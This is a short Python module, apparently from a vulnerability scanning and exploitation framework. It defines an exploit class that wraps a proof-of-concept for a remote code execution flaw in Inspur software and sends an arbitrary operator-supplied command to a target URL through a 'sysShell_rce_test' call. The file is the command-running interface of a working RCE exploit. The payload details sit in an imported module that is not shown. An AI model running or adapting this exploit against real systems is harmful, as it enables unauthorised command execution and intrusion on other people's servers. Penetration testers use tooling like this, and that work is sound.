from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .inspur_rce_poc import POC
from ..requestClass import Requests


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)


    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        url = self.vuln.url
        result = poc.sysShell_rce_test(url, self.vuln.specify, cmd)
        return result
